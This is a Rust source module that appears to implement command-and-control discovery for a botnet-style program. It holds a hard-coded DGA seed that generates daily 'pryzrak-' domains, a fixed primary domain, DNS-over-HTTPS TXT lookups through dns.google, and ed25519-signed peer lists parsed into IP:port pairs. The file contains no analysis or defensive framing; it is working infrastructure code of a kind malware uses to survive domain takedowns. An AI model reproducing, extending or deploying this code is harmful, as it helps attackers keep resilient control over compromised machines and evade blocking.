use std::time::{SystemTime, UNIX_EPOCH};
use log::{info, warn, debug};
use serde::Deserialize;
use reqwest::Client;
use base64::{Engine as _, engine::general_purpose};
use ed25519_dalek::{Verifier, VerifyingKey, Signature};

const DGA_SEED: u64 = 0x36A5EC9D09C60386;
const PRIMARY_DOMAIN: &str = "dht.polydevs.uk";

// Should match the key used by Edge/Cloud to verify
const DISCOVERY_KEY: [u8; 32] = [
    0x75, 0xbf, 0x34, 0x60, 0xf7, 0x00, 0x57, 0x06, 
    0xa3, 0x82, 0x85, 0x4d, 0x0b, 0x31, 0xc7, 0x63, 
    0x30, 0x4d, 0x15, 0x19, 0x18, 0xd1, 0xca, 0x87, 
    0xe7, 0x38, 0x99, 0xcc, 0x79, 0x3d, 0xb8, 0x6a
];

#[derive(Deserialize)]
struct DohResponse {
    #[serde(rename = "Answer")]
    answer: Option<Vec<DohAnswer>>,
}

#[derive(Deserialize)]
struct DohAnswer {
    data: String,
}

/// Generates the daily domain
pub fn generate_domain() -> String {
    let start = SystemTime::now();
    let since_the_epoch = start.duration_since(UNIX_EPOCH)
        .expect("Time went backwards");
        
    let seconds = since_the_epoch.as_secs();
    let day_slot = seconds / 86400;
    
    let mut state = day_slot ^ DGA_SEED;
    state ^= state << 13;
    state ^= state >> 7;
    state ^= state << 17;
    
    format!("pryzrak-{:x}.com", state & 0xFFFFFF)
}

async fn resolve_doh(domain: &str) -> Option<Vec<(String, u16)>> {
    let client = Client::new();
    let url = format!("https://dns.google/resolve?name={}&type=TXT", domain);
    
    debug!("[DGA] Querying {}", url);
    match client.get(&url).send().await {
        Ok(resp) => {
            if let Ok(data) = resp.json::<DohResponse>().await {
                if let Some(answers) = data.answer {
                    for answer in answers {
                        let raw_txt = answer.data.trim_matches('"').replace("\\\"", "\"");
                        if raw_txt.contains("SIG:") {
                            if let Ok(peers) = verify_and_parse(&raw_txt) {
                                return Some(peers);
                            }
                        }
                    }
                }
            }
        }
        Err(e) => warn!("[DGA] DoH Failed for {}: {}", domain, e),
    }
    None
}

fn verify_and_parse(text: &str) -> Result<Vec<(String, u16)>, Box<dyn std::error::Error>> {
    let parts: Vec<&str> = text.split('|').collect();
    if parts.len() != 2 { return Err("Invalid Format".into()); }
    
    let sig_bytes = general_purpose::STANDARD.decode(parts[0].strip_prefix("SIG:").ok_or("No SIG prefix")?)?;
    let msg_bytes = general_purpose::STANDARD.decode(parts[1].strip_prefix("MSG:").ok_or("No MSG prefix")?)?;
    
    let vk = VerifyingKey::from_bytes(&DISCOVERY_KEY)?;
    let signature = Signature::from_bytes(&sig_bytes.try_into().map_err(|_| "Sig Len")?);
    
    vk.verify(&msg_bytes, &signature)?;
    
    let msg_str = String::from_utf8(msg_bytes)?;
    let mut peers = Vec::new();
    for part in msg_str.split(';') {
        if let Some((ip, port_str)) = part.split_once(':') {
            if let Ok(port) = port_str.parse::<u16>() {
                peers.push((ip.to_string(), port));
            }
        }
    }
    Ok(peers)
}

/// Resolves the domain to find peers (TXT Record) with Priority
pub async fn resolve_peers() -> Vec<(String, u16)> {
    // 1. Priority: Fixed Home Domain
    info!("[Bootstrap] Checking Primary: {}", PRIMARY_DOMAIN);
    if let Some(peers) = resolve_doh(PRIMARY_DOMAIN).await {
         info!("[Bootstrap] Found {} peers via Primary.", peers.len());
         return peers;
    }
    
    // 2. Fallback: DGA
    let domain = generate_domain();
    info!("[Bootstrap] Primary Failed. Checking DGA: {}", domain);
    if let Some(peers) = resolve_doh(&domain).await {
        info!("[Bootstrap] Found {} peers via DGA.", peers.len());
        return peers;
    }
    
    warn!("[Bootstrap] All Discovery Methods Failed. Fallback to Localhost.");
    vec![
        ("127.0.0.1".to_string(), 31338), // Fallback
    ]
}
